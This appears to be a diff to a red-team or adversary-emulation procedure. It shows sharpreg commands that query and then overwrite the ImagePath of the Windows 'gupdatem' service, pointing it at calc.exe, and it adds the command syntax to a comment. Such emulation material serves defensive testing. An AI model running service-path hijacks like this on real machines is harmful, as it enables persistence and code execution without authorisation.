@@ -10,7 +10,7 @@ Adversaries may interact with the Windows Registry to hide configuration informa
 
 sharpreg query HKLM\SYSTEM\CurrentControlSet\services\gupdatem | poshgrep ImagePath 
 
-# Here we change the key that we just queried above. We notated what it was before we make changes
+# Here we change the key that we just queried above. We notated what it was before we make changes. The syntax: sharpreg create <"location"> <"key value"> <"key details"> <value type>
 
 sharpreg create "HKLM\SYSTEM\CurrentControlSet\Services\gupdatem"  "ImagePath" "C:\Windows\WinSxS\x86_microsoft-windows-calc_31bf3856ad364e35_10.0.14393.0_none_7b13d13279112b2e\calc.exe" EXPAND_SZ
 
